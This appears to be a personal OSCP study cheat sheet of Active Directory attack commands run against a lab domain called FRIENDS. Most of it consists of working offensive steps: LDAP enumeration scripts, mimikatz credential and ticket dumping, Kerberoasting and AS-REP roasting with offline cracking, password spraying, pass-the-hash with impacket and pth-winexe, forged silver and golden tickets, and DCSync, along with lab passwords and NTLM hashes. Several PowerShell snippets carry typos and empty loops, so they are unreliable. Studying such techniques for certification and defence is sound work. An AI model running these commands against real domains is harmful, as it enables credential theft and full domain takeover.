# ACTIVE DIRECTORY ATTACKS
Following are some important commands and techniques useful for OSCP preparation

## DOMAIN PENTEST ENVIRONMENT
### DOMAIN MACHINES 
> link
(https://github.com/Hellsender01/Youtube/blob/main/Active%20Directory/Passwords.md)
```
rgreen/DirtyPassword23
rgeller/Password123!@#
```

### KALI LINUX

```
/var/www/html/ad_tools
pass.txt     
SharpHound.exe  
svc_hash
mimikatz.exe  
mimidrv.sys
mimilib.dll   
PsExec64.exe  
shell-x64.exe
```

### MACHINE COMPROMISE SIMULATE

```
RDP

IMPACKET (PASSWORD)

IMPACKET (HASH)
```



## DOMAIN ENUMERATION TECHNIQUES

### NET BINARY

```
net user
net localgroup 
net users test1

net user /domain
net group /domain
net user cbing /domain
net groups /domain "Domain Admins"
```


### POWERSHELL

>Following are some popular powersellscripts used for AD enumeraion

+ DISTINGUISHED NAME

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
```

+ LDAP PROVIDER PATH

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$SearchString
```

+ DIRECTORY SEARCHER CLASS PREPERATION

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
$Searcher.SearchRoot = $objDomain
```

+ DOMAIN USERS

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
$Searcher.SearchRoot = $objDomain 
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368" 
$Result= $Searcher.FindAll() 
Foreach ($obj in $Result) 
{ 
Foreach($prop in $obj.Properties) 
{ 
$prop 
} 
Write-Host "------------------------"
}
```

+ DOMAIN GROUPS

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result= $Searcher.FindAll()
Foreach ($obj in $Result)
{
$obj.Properties.name
}
```

+ NESTED GROUPS - USERS/GROUPS INSIDE GROUPS

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$0istinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Administrators)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```
```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$0istinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=test_group)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$0istinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Nested_group)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=another_Nested-group)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

+ SERVICE ACCOUNTS ENUMERATION VIA SERVICE PRINCIPAL NAMES 

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
}
Foreach($prop in $obj.Properties)
{
$prop
}
```

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*backup*"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
}
Foreach($prop in $obj.Properties)
{
$prop
}
```

### BLOOD HOUND / SHARP HOUND

#### BLOODHOUND SETUP / KALI
```
sudo apt update && sudo apt install -y bloodhound
sudo neo4j start
```
>cred:neo4j/neo4j
```
http://localhost:7474/browser/
```
>change cred: neo4j/test

>bloodhound start

#### BLOODHOUND USAGE - SCENARIO 1

+ Windows Level Working 
```
cmd.exe
Sharphound.exe
```

+ Kali Level Working
```
sudo neo4j start
```
>bloodhound start

>login with neo4j/test

>import sharphound file
 
>clear database - to clear previous results imported into bloodhound

#### BLOODHOUND USAGE - SCENARIO 2

+ Kali Level Working
```
impacket-psexec 'FRIENDS/rgeller:Password123!@#@192.168.174.129'
lput SharpHound.exe
cd ..
SharpHound.exe
dir
20230106123630_BloodHound.zip
lget 20230106123630_BloodHound.zip
```

## ACTIVE DIRECTORY AUTHENTICATION

### NTLM AUTHENTICATION

### KERBEROS AUTHENTICATION

```
TGS_REQ
TGS_REP	

AP_REQ
AP_REP


 ENC KEY = HASH (USER CREDS)
TGT_REQ
TGT_REP
	session-key1 + TGT       ENC KEY = HASH (KRBTG CREDS)
	
TGS_REQ
TGS_REP
	session-key2 + TGS       ENC KEY = HASH (SERVICE ACCOUNT CREDS)

AP_REQ
AP_REP
```

``` 
TGT_REQ
	ENC KEY = HASH (USER CREDS)
	ENC[timestamp]
TGT_REP
	session-key1 + TGT
	
TGS_REQ
	TGT,SPN, ENC[username,timestamp]
TGS_REP
	SKI[SPN,session-key2] + TGS 

AP_REQ
	TGS, ENC[username,timestamp]
AP_REP
```

```
TGT_REQ
TGT_REP
	session key -> encrypted -> password hash of user
	TGT -> encrypted -> password hash of KRBTG

TGS_REQ
TGS_REP
	session key -> encrypted -> password hash of secert key (TGT)
	TGS - encrypted -> password hash of SPN

AP_REQ
AP_REP
```



## DOMAIN PRIVILEGE ESCALATION TECHNIQUES

### CACHED AD CREDENTIALS 

```
privilege::debug (enable SetDebug privilege)
sekurlsa::logonpasswords (Show password hashes)
sekurlsa::tickets (Show tickets)
```

### KERBORASTING / SERVICE ACCOUNT ATTACKS

> domain client machine compromise

> privilege escalate

> domain machine: cmd/powershell/GUI

+ SCENARIO.1

> DOMAIN CLIENT ACTIVITIES

> powershell (runas administrator)

```
Add-Type -AssemblyName System.IdentityModel
```
```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'FRIENDS-DC/svc_backup.FRIENDS.local:1337'
```
```
klist
```
```
mimikatz.exe
kerberos::list
kerberos::list /export
```

> KALI LINUX

```
cp 1-40a10000-rgeller@FRIENDS-DC~svc_backup.FRIENDS.local~1337-FRIENDS.LOCAL.kirbi /var/www/html/ad_tools
```
```
python /usr/share/kerberoast/tgsrepcrack.py pass.txt
```
```
2-40a10000-rgeller@FRIENDS-DC~svc_backup.FRIENDS.local~1337-FRIENDS.LOCAL.kirbi 
```
> kirbi2john 
```
'2-40a10000-central-perk$@FRIENDS-DC~svc_backup.FRIENDS.local~1337-FRIENDS.LOCAL.kirbi' > svc_hash
```
```
john svc_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

+ SCENARIO.2
> lget
```
2-40a10000-central-perk$@FRIENDS-DC~svc_backup.FRIENDS.local~1337-FRIENDS.LOCAL.kirbi
```

> SAMPLE SPNS

> HTTP/CorpWebServer.corp.com

> FRIENDS-DC/svc_backup.FRIENDS.local:1337

> NOTES
```
sudo apt install kerberoast
```

### SLOW PASSWORD GUESSING (PASSWORD SPRAYING TECHNIQUE)net accounts
> AD login

> DirectoryEntry instance
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "rgreen", "DirtyPassword234")
```
```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
.\Spray-Passwords.ps1 -Pass DirtyPassword23 -Admin
.\Spray-Passwords.ps1 -Pass Password9 -Admin
````
> The -Pass option allows us to set a single password to test, or we can submit a wordlist file with -
File.

> We can also test admin accounts with the addition of the -Admin flag.

### RDP PASSWORD GUESSING


## DOMAIN LATERAL MOVEMENT TECHNIQUES

### PASS THE HASH

> compromise a domain client machine (domain user access) escalate privilege of domain user to local admin

> login with rgeller user on domain client

> rgeller is domain user and local admin 

> the compromised scenario has been simulated

> simulate admin user login into domain client

> open notepad as domain admin (FRIENDS\cbing:Password4)

+ NTLM HASH EXTRACTION
```
cmd.exe
--mimikatz.exe
--privilege::debug
--sekurlsa::logonpasswords
--7247e8d4387e76996ff3f18a34316fdd (cbing)
```

+ PASS THE HASH (IMPACKET)
```
impacket-psexec -hashes 00000000000000000000000000000000:7247e8d4387e76996ff3f18a34316fdd FRIENDS/cbing@192.168.174.140 powershell.exe
```

+ PASS THE HASH (PTH)

> pth-winexe -U 
```
Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

+ PASS THE HASH (PSEXEC/METASPLOIT)

+ PASS THE HASH
```
impacket-psexec 'FRIENDS/rgeller@192.168.174.129' -hashes 00000000000000000000000000000000:906cc3291a7fb123ca964eeeca0aff07
```
```
pth-winexe -U FRIENDS/rgeller %00000000000000000000000000000000:906cc3291a7fb123ca964eeeca0aff07 //192.168.174.129 cmd
```

### OVERPASS THE HASH

> compromise a domain client machine (domain user access) escalate privilege of domain user to local admin

> login with rgeller user on domain client

> rgeller is domain user and local admin 

> the compromised scenario has been simulated

> simulate admin user login into domain client

> open notepad as domain admin (FRIENDS\cbing:Password4)

+ NTLM hash extraction
```
cmd.exe
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
7247e8d4387e76996ff3f18a34316fdd (cbing)
```

+ NTLM Hash to TGT/TGS 
```
sekurlsa::pth /user:jeff_admin /domain:corp.com 
/ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
sekurlsa::pth /user:cbing /domain:FRIENDS.local 
/ntlm:7247e8d4387e76996ff3f18a34316fdd /run:PowerShell.exe
klist
```

> POWERSHELL PROCESS OPENED WITH CBING BUT SOMETIME DOESNT CONTAIN TGT - GET TGT AS FOLLOWS
```
net use \\dc01
net use \\FRIENDS-DC
```

> OPEN CMD WITH CBING TGT
```
.\PsExec.exe \\dc01 cmd.exe
.\PsExec64.exe \\FRIENDS-DC cmd.exe
```

> WIRESHARK
```
--ip.addr==192.168.174.140&&!dns
--ip.addr==192.168.174.140&&!dns&&tcp.port eq 88
```

### PASS THE TICKET (SILVER TIKCET)
```
whoami /user
kerberos::purge
kerberos::list
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP  /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```
> The silver ticket command requires 
> + a username (/user), 
> + domain name (/domain)
> + the domain SID (/sid), which is highlighted above
> + the fully qualified host name of the service (/target)
> + the service type (/service:HTTP)
> + the password hash of the iis_service service account (/rc4) 

```
kerberos::list
service ticket inject
```

### DCOM

## DOMAIN PERSISTENCE TECHNIQUES

### GOLDEN TICKETS

> GETTING PASSWORD HASHES
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 
FRIENDS.local/cbing:Password4@192.168.174.140
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5ff2e66766b112b2b9dee4f938d5c51f:::
```
> GOLDEN TICKETS CREATION

> + ACTIVITIES ON DOMAIN CONTROLLER 
```
whoami /user
friends\rgreen S-1-5-21-1344083314-2267945536-981813235-1111
```
```
privilege::debug
lsadump::lsa /patch
5ff2e66766b112b2b9dee4f938d5c51f
```

> + ACTIVITIES ON DOMAIN CLIENT 

```
mimikatz.exe
privilege::debug
kerberost::list
kerberos::purge
kerberos::golden /user:fakeuser /domain:FRIENDS.local /sid:S-1-5-21-1344083314-2267945536-981813235 /krbtgt:5ff2e66766b112b2b9dee4f938d5c51f /ptt
misc::cmd
PsExec64.exe \\FRIENDS-DC cmd.exe
```

### DOMAIN CONTROLLER SYNCHRONIZATION

> LOGIN DOMAIN MACHINE AS DOMAIN ADMIN USER
```
mimikatz.exe
privilege::debug
lsadump::dcsync /user:Administrator
```

+ domain fronting

+ domain hiding


### EXPERIMENTS
> runas /user:FRIENDS\rgreen C:\Windows\system32\cmd.exe
> + domain login activity
> + AS-REQ / AS-REP (TGT generate) 
> + GS-REQ / TGS-REP (TGS generate) 

### WIRESHARK
```
ip.addr==192.168.174.140&&!dns
```

### AS-REP Roasting
```
-- Kerberos preauthentication enabled (default)
-- Kerberos preauthentication disabled (custom)
```
### Rubeus.exe asreproast
```
Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt
hashcat64.exe -m 18200 c:Temphashes.txt example.dict
```

### POWERSHELL REMOTING

### DOMAIN PRIVILEGE ESCALATION

> KERBEROAST
> + named domain account
> + machine account passwords
> + service account must be a named domain user 
> + service accounts which are not using machine accounts

## FIND SERVICE ACCOUNTS

link(https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1)

> Powerview

> Get-NetUser -SPN
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
```

### FIND SERVICE ACCOUNTS (Get-NetUser -SPN)
```
powershell -ep bypass
.\PowerView.ps1
Get-NetUser -SPN
```

### FIND SERVICE ACCOUNTS (Get-ADUser)
```
.\Install-ActiveDirectoryModule.ps1
help Install-ActiveDirectoryModule.ps1 - Examples
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
```

### REQUEST TGS

###SAVE TICKETS TO DISC
```
.\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command "kerberos::list /export"
```
## ENUMERATION

> ACL

> misconfigured ACL

### KERBEROAST DELEGATION

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "rgeller", "Password123!@#")
```

```
.\PsExec64.exe \\FRIENDS-DC cmd.exe -accepteula
.\PsExec64.exe -accepteula \\FRIENDS-DC cmd.exe 
```
```
net use z: \\servername\folder /user:username password
net use \\192.168.174.140 /user:rgreen DirtyPassword23

runas /savecred /user:rgreen cmd.exe
runas /user:rgreen cmd.exe


runas /user:FRIENDS\rgreen C:\Windows\system32\cmd.exe


net use \\FRIENDS-DC
```



















